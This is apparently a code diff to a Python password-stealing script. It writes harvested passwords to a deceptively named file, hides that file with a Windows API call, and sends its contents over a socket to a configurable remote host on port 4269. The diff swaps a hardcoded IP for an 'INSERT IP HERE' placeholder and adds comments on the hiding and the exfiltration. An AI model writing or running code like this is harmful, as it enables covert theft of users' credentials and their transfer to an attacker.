@@ -44,15 +44,15 @@ with open ('nothing_to_see_here420869.txt', 'w') as f:
 #it makes a file and writes the passwords in
 
 #Sending via socket to a specific ip
-HOST = '192.168.92.111'
+HOST = 'INSERT IP HERE'
 PORT = 4269
 file= 'nothing_to_see_here420869.txt'
 
 if os.path.exists(file):
     # 0x02 sets the file attribute to hidden
+    # You wont be able to see the password if its hidden. Turn on view hidden files in windows file explorer to see this.
     ctypes.windll.kernel32.SetFileAttributesW(file, 0x02)
-
-
+# This will send the password file to a specific ip. If you dont want it to do that you can delete the below part.
 with open (file, 'rb') as file, socket.socket() as s:
 
     while True:
